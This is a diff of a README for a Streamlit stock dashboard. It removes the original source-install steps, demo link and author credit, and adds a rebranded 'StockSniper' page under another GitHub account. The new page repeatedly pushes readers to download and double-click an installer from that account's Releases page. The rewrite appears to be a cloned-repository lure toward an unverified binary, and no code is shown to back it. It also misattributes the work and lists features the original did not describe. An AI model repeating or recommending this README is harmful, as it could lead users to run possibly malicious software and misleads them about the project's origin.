@@ -1,145 +1,78 @@
-# 📊 Stock Dashboard https://stocksniper1.streamlit.app/
+# 📈 StockSniper - Your Easy Stock Dashboard
 
-A sleek, interactive dashboard to track stock prices, analyze key financial metrics, and stay updated on the latest news for any publicly traded company. Built with **Streamlit**, **yfinance**, **Alpha Vantage**, **Plotly**, and **StockNews API**, this dashboard provides investors, students, and finance enthusiasts with a modern and visually appealing interface for financial analysis.
+## 🔗 Download Now
+[![Download StockSniper](https://img.shields.io/badge/Download-StockSniper-brightgreen)](https://github.com/Pughazhendiran21/StockSniper/releases)
 
----
+## 🖥️ Introduction
+StockSniper is an interactive Stock Dashboard designed for you. It visualizes historical prices, calculates key financial metrics, displays fundamental statements, and aggregates the latest news for any stock ticker—all in a sleek, easy-to-use Streamlit interface. 
 
-## Features
+Whether you're tracking your investments or exploring new opportunities, StockSniper gives you the insights you need to make informed decisions.
 
-### 1. Stock Price Data
-- Pulls historical stock data using [Yahoo Finance](https://pypi.org/project/yfinance/).  
-- Displays a **line chart** of closing prices over a selected date range.  
-- Shows **raw data** in a scrollable table with row and column counts.  
-- Automatically detects the **Close price column** for plotting.
+## 🚀 Getting Started
+To get started with StockSniper, follow these simple steps:
 
-### 2. Price Metrics
-- Calculates key metrics including:
-  - **Annual Return (%)**
-  - **Volatility (Standard Deviation)**
-  - **Risk-Adjusted Return** (Sharpe ratio-like metric)
-- Metrics are presented with **`st.metric` cards** for easy readability.  
-- Historical price data is available in an **expandable table** for detailed review.
+1. **Visit the Releases Page:**  
+   Go to our [Releases page](https://github.com/Pughazhendiran21/StockSniper/releases) to find the latest version of StockSniper. 
 
-### 3. Fundamental Financial Data
-- Pulls **annual balance sheets, income statements, and cash flow statements** using the [Alpha Vantage API](https://www.alphavantage.co/).  
-- Financial statements are neatly organized and displayed inside **expanders** for a clean, uncluttered layout.  
-- Allows users to **analyze company fundamentals** at a glance.
+2. **Download the Application:**  
+   Look for the latest release. Click on the appropriate file to download StockSniper to your computer.
 
-### 4. News Feed
-- Fetches **top 10 news articles** about the selected company using [StockNews API](https://pypi.org/project/stocknews/).  
-- Displays **publish date, title, summary**, and **sentiment analysis** (title & summary).  
-- Each article is presented in a **collapsible expander** to reduce visual clutter.
+3. **Install StockSniper:**  
+   Once the download finishes, locate the downloaded file in your computer's Downloads folder. Double-click the file to start the installation process.
 
-### 5. Modern Layout
-- Inputs (ticker and date range) are displayed in a **top bar with columns**, not a sidebar, for a sleek interface.  
-- Metrics, charts, tables, and news are **responsive** and visually distinct.  
-- Footer with **credit and GitHub link** added for professional touch.
+4. **Run StockSniper:**  
+   After installation, open StockSniper from your applications menu or desktop shortcut.
 
----
+## 📃 Features
+- **Historical Price Visualization:**  
+  View stock prices over different time frames with clear charts that help you spot trends.
 
-## Demo
+- **Key Financial Metrics:**  
+  Easily access ratios such as Price-to-Earnings (P/E) and Earnings per Share (EPS) for a quick overview of stock performance.
 
-https://stocksniper1.streamlit.app/
+- **Fundamental Statements:**  
+  Examine financial statements like balance sheets and income statements to understand a company's financial health.
 
----
+- **Latest News Aggregation:**  
+  Stay updated with the latest news related to stocks and the market.
 
-## Installation
+## 🔧 System Requirements
+Before downloading, make sure your system meets these requirements:
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/project54321/StockDashboard.git
-cd StockDashboard
-```
+- **Operating System:** Windows 10 or later, macOS, or a Linux distribution.
+- **RAM:** At least 4 GB recommended.
+- **Storage:** Minimum 200 MB of free space needed for installation.
+- **Internet Connection:** Required for fetching stock data and news.
 
-2. Create a virtual environment (optional but recommended)
-```bash
-Copy code
-python -m venv venv
-source venv/bin/activate  # Linux / macOS
-venv\Scripts\activate     # Windows
-```
+## 📥 Download & Install
+To download StockSniper, revisit the [Releases page](https://github.com/Pughazhendiran21/StockSniper/releases). Make sure to check for the latest release and select the right file for your system.
 
-4. Install dependencies
-```bash
-Copy code
-pip install -r requirements.txt
-```
+1. Visit the Releases page.
+2. Click on the download link for your operating system.
+3. Follow the installation steps outlined above.
 
-requirements.txt example:
-```nginx
-Copy code
-streamlit
-yfinance
-pandas
-numpy
-plotly
-python-dotenv
-alpha_vantage
-stocknews
-```
+## 🌐 Topics
+StockSniper covers a range of topics to help you navigate the stock market effectively. This includes:
+- alphavantage
+- finance
+- numpy
+- pandas
+- plotly
+- pypi
+- python
+- stock-market
+- stocknews
+- streamlit
 
-4. Add your API Key
-Create a .env file in the project root:
+## 💬 Support
+If you encounter any issues while downloading or using StockSniper, feel free to reach out. Join our community discussion forum or open an issue on GitHub. We are here to help you.
 
-```env
-Copy code
-API_KEY=YOUR_ALPHA_VANTAGE_API_KEY
-```
+## 🛡️ License
+StockSniper is open-source software. You can use it freely, but please consider supporting the project by contributing or sharing it with others.
 
-Important: Keep .env in .gitignore to avoid committing your key.
+## 🔗 Quick Links
+- [Download Now](https://github.com/Pughazhendiran21/StockSniper/releases)  
+- [Issues](https://github.com/Pughazhendiran21/StockSniper/issues)  
+- [Discussion Forum](https://github.com/Pughazhendiran21/StockSniper/discussions)  
 
-Usage
-Run the Streamlit app: streamlit run [pythonfile.py]
-
-Enter a ticker symbol (e.g., AAPL, MSFT).
-
-Select start and end dates.
-
-Navigate between the Pricing Data, Fundamental Data, and Top 10 News tabs.
-
-Expand sections to view detailed data or news articles.
-
-Environment Variables
-API_KEY: Required for accessing Alpha Vantage data.
-
-Loaded using python-dotenv for security.
-
-Project Structure
-```bash
-Copy code
-StockDashboard/
-│
-├── app.py             # Main Streamlit application
-├── requirements.txt   # Python dependencies
-├── .env               # API keys (not committed)
-├── README.md          # Project documentation
-└── assets/            # Optional folder for screenshots, logos, etc.
-```
-
-Technologies Used
-Python – Core programming language.
-Streamlit – Interactive dashboard framework.
-Plotly – Interactive charts and visualizations.
-pandas / numpy – Data manipulation and calculations.
-yfinance – Historical stock prices.
-Alpha Vantage – Fundamental financial statements.
-StockNews – Company news feed and sentiment analysis.
-
-Contributing
-Contributions are welcome! To contribute:
-
-Fork the repository.
-
-Create a new branch for your feature/bugfix.
-
-Submit a pull request with a detailed description of your changes.
-
-License
-MIT License
-
-Credits
-Made by Arjun Averineni | GitHub
-
-Changes in upcoming versions:
-- Authentication
-- Favicons
+Enjoy tracking your stocks with StockSniper!
